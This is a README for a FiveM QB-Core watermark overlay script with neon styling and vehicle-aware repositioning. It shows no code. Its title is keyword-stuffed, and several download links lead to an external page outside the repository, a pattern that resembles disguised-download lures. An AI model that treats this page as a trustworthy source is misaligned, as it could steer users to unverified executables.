# qp-watermark v2026 - Game Script Utility 2026

> QB-Core watermark overlay for FiveM with a neon glow aesthetic, always-on visibility behavior, and vehicle-sensitive placement for a cleaner in-game branding layer.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathan-king21/qp-watermark-script?style=flat-square)](https://github.com/nathan-king21/qp-watermark-script)

---

<p align="center">
  <a href="https://nathan-king21.github.io/qp-watermark-script/">
    <img src="https://img.shields.io/badge/Download-qp--watermark%20Script-brightgreen?style=for-the-badge" alt="Download qp-watermark Script">
  </a>
</p>

> **[Direct Download - qp-watermark](https://nathan-king21.github.io/qp-watermark-script/)**

---

[Download Latest Build](https://nathan-king21.github.io/qp-watermark-script/)

---

## Overview

qp-watermark is a FiveM UI resource built on QB-Core that keeps a custom watermark on screen as players move between normal gameplay and menu states. It is aimed at server branding, giving your interface a stable overlay with a neon glow presentation that can be adapted through Lua and HTML.

It also adds vehicle-aware placement, automatically moving the watermark toward the top-right once the player enters a vehicle. This helps preserve the branding without needing manual repositioning, while keeping the project lightweight and centered on presentation plus simple configuration.

## Script Features

- Custom branding overlay for FiveM servers
- Neon glow visual styling for the watermark
- Automatic vehicle reposition behavior
- Persistent display during menus and gameplay states
- QB-Core native integration
- Lightweight performance profile
- Lua and HTML configurable structure
- Built for straightforward branding adjustments

## Setup

1. Download the latest build from the project link above.
2. Place the resource folder inside your FiveM resources directory.
3. Rename the folder if needed to match your server naming style.
4. Add the resource to your server start list.
5. Configure the Lua and HTML files to match your branding and layout preferences.

Example resource entry:

ensure qp-watermark

If you want to change how it looks, begin with the HTML layout and then adjust the Lua logic for positioning or visibility rules.

## Options

| Setting | Purpose | Notes |
| --- | --- | --- |
| Branding text | Defines the visible watermark label | Update in the HTML or shared config area |
| Neon styling | Controls the glow-heavy appearance | Useful for matching server theme colors |
| Vehicle reposition | Moves the overlay when driving | Keeps the display aligned in vehicles |
| Persistent display | Keeps the watermark active across states | Intended for menu and in-game use |
| QB-Core hook | Connects the script to QB-Core behavior | Best suited for QB-Core based servers |

## Compatibility

qp-watermark is designed for FiveM servers running QB-Core. Because it uses Lua and HTML, it works best in setups that support custom UI resources.

Any limits you run into will usually depend on configuration choices and the way the server handles UI layering. If you use several overlays, you may need to refine placement, spacing, or load order so elements do not overlap.

## FAQ

### How do I install it?
Download the resource, put it in your server resources folder, and then add it to your startup configuration using the proper resource name.

### Can I change the branding?
Yes. You can edit the branding text and layout through the Lua and HTML files that come with the resource.

### Does it support vehicle use?
Yes. The script includes automatic reposition logic that shifts the watermark to the top-right while in vehicles.

### Is it limited to one display style?
No. The visual structure is configurable, so you can adjust the overlay to fit your server identity and layout goals.

### Will it stay visible in menus?
The script is intended to keep the display active across menu states as well as in-game, depending on how you configure it.

### Where should I keep the files?
Keep the resource inside your FiveM resources directory, and leave related edits in the same folder so future updates are easier to manage.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
